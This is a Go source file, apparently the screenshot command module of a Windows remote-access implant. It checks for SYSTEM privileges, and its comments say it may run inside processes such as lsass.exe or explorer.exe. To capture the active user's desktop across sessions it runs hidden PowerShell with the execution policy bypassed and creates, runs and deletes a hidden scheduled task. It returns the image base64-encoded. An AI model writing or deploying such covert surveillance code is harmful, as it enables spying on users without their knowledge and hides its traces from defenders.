//go:build windows
// +build windows

package commands

import (
	"encoding/base64"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"

	"golang.org/x/sys/windows"
)

// isSystemProcess 检测当前进程是否是 SYSTEM 权限
func isSystemProcess() bool {
	var token windows.Token
	err := windows.OpenProcessToken(windows.CurrentProcess(), windows.TOKEN_QUERY, &token)
	if err != nil {
		// 如果无法获取令牌，假定为普通用户（保守策略）
		return false
	}
	defer token.Close()

	// 获取令牌的用户 SID
	tokenUser, err := token.GetTokenUser()
	if err != nil {
		return false
	}

	// 创建 SYSTEM 账户的 Well-Known SID
	systemSid, err := windows.CreateWellKnownSid(windows.WinLocalSystemSid)
	if err != nil {
		return false
	}

	// 比较当前进程的 SID 是否是 SYSTEM
	return tokenUser.User.Sid.Equals(systemSid)
}

// TakeScreenshot 截取屏幕并返回 Base64 编码的 PNG 图片
// 根据进程权限自动选择截图策略
func TakeScreenshot() string {
	// 策略选择：
	// - SYSTEM 权限进程（如 spoolsv.exe, lsass.exe）→ 通常在 Session 0，需要跨 Session 截图
	// - 用户权限进程（如 explorer.exe, notepad.exe）→ 在用户 Session，直接截图

	if isSystemProcess() {
		// 策略 1: SYSTEM 进程，使用 schtasks 跨 Session 截图
		return takeScreenshotViaScheduledTask()
	} else {
		// 策略 2: 用户进程，直接使用 PowerShell 截图（更快，更稳定）
		return takeScreenshotDirect()
	}
}

// takeScreenshotDirect 直接在当前 Session 截图（用于用户进程）
func takeScreenshotDirect() string {
	// 生成临时文件路径
	tempFile := filepath.Join("C:\\Windows\\Temp", fmt.Sprintf("scr_%d.png", time.Now().Unix()))
	defer os.Remove(tempFile)

	// PowerShell 截图脚本
	screenshotScript := fmt.Sprintf(`
Add-Type -AssemblyName System.Windows.Forms, System.Drawing
$bounds = [System.Windows.Forms.SystemInformation]::VirtualScreen
$bmp = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height)
$graphics = [System.Drawing.Graphics]::FromImage($bmp)
$graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
$bmp.Save('%s', [System.Drawing.Imaging.ImageFormat]::Png)
$graphics.Dispose()
$bmp.Dispose()
`, tempFile)

	// 直接执行 PowerShell（不经过 schtasks）
	cmd := exec.Command("powershell", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-Command", screenshotScript)
	if err := cmd.Run(); err != nil {
		return fmt.Sprintf("Error executing screenshot: %v", err)
	}

	// 等待文件写入完成
	time.Sleep(1 * time.Second)

	// 读取截图
	imgData, err := os.ReadFile(tempFile)
	if err != nil {
		return fmt.Sprintf("Error reading screenshot: %v", err)
	}

	if len(imgData) == 0 {
		return "Error: Screenshot file is empty"
	}

	return "[IMAGE]" + base64.StdEncoding.EncodeToString(imgData)
}

// takeScreenshotViaScheduledTask 通过计划任务跨 Session 截图（用于 Session 0 服务）
func takeScreenshotViaScheduledTask() string {
	// 生成临时文件路径
	tempFile := filepath.Join("C:\\Windows\\Temp", fmt.Sprintf("scr_%d.png", time.Now().Unix()))
	defer os.Remove(tempFile)

	// 1. 创建截图脚本
	screenshotScript := fmt.Sprintf(`
Add-Type -AssemblyName System.Windows.Forms, System.Drawing
$bounds = [System.Windows.Forms.SystemInformation]::VirtualScreen
$bmp = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height)
$graphics = [System.Drawing.Graphics]::FromImage($bmp)
$graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
$bmp.Save('%s', [System.Drawing.Imaging.ImageFormat]::Png)
$graphics.Dispose()
$bmp.Dispose()
`, tempFile)

	scriptPath := filepath.Join(os.TempDir(), fmt.Sprintf("scr_%d.ps1", time.Now().Unix()))
	if err := os.WriteFile(scriptPath, []byte(screenshotScript), 0644); err != nil {
		return fmt.Sprintf("Error writing screenshot script: %v", err)
	}
	defer os.Remove(scriptPath)

	// 2. 获取当前活动用户（使用 PowerShell）
	psGetUser := `(Get-WmiObject -Class Win32_ComputerSystem).UserName`
	queryCmd := exec.Command("powershell", "-Command", psGetUser)
	queryOutput, err := queryCmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("Error querying users: %v", err)
	}

	username := strings.TrimSpace(string(queryOutput))
	if username == "" {
		return "Error: No active user found"
	}

	// 3. 创建任务 XML
	taskName := fmt.Sprintf("Screenshot_%d", time.Now().Unix())
	taskXml := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Principals>
    <Principal>
      <UserId>%s</UserId>
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>false</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
  </Settings>
  <Actions>
    <Exec>
      <Command>powershell.exe</Command>
      <Arguments>-ExecutionPolicy Bypass -WindowStyle Hidden -File "%s"</Arguments>
    </Exec>
  </Actions>
</Task>`, username, scriptPath)

	xmlPath := filepath.Join(os.TempDir(), fmt.Sprintf("task_%d.xml", time.Now().Unix()))
	if err := os.WriteFile(xmlPath, []byte(taskXml), 0644); err != nil {
		return fmt.Sprintf("Error writing task XML: %v", err)
	}
	defer os.Remove(xmlPath)

	// 4. 创建并运行任务
	cmd := exec.Command("schtasks", "/Create", "/TN", taskName, "/XML", xmlPath, "/F")
	if output, err := cmd.CombinedOutput(); err != nil {
		return fmt.Sprintf("Error creating task: %v, Output: %s", err, string(output))
	}

	cmd = exec.Command("schtasks", "/Run", "/TN", taskName)
	cmd.Run()

	// 等待任务执行
	time.Sleep(3 * time.Second)

	// 删除任务
	exec.Command("schtasks", "/Delete", "/TN", taskName, "/F").Run()

	// 5. 读取截图
	imgData, err := os.ReadFile(tempFile)
	if err != nil {
		return fmt.Sprintf("Error reading screenshot: %v", err)
	}

	if len(imgData) == 0 {
		return "Error: Screenshot file is empty"
	}

	return "[IMAGE]" + base64.StdEncoding.EncodeToString(imgData)
}

// contains 检查字符串是否包含子串
func contains(s, substr string) bool {
	return len(s) >= len(substr) && indexOf(s, substr) >= 0
}

func indexOf(s, substr string) int {
	for i := 0; i <= len(s)-len(substr); i++ {
		if s[i:i+len(substr)] == substr {
			return i
		}
	}
	return -1
}
